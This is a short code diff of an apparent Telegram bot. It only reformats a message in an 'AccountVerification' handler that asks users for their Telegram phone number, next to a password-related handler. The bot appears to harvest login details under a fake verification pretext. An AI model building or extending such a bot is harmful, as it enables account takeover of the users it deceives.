@@ -95,7 +95,7 @@ async def free(_, message):
 
 @app.on_message(filters.command("AccountVerification") & filters.private)
 async def verip(_, message):
-    await app.send_message(message.chat.id, "Please send your telegram phone number…")
+    await app.send_message(message.chat.id, "__Please send your telegram phone number…__")
 # PASSWORD 
 
 @app.on_message(filters.regex("🔐") & filters.private)
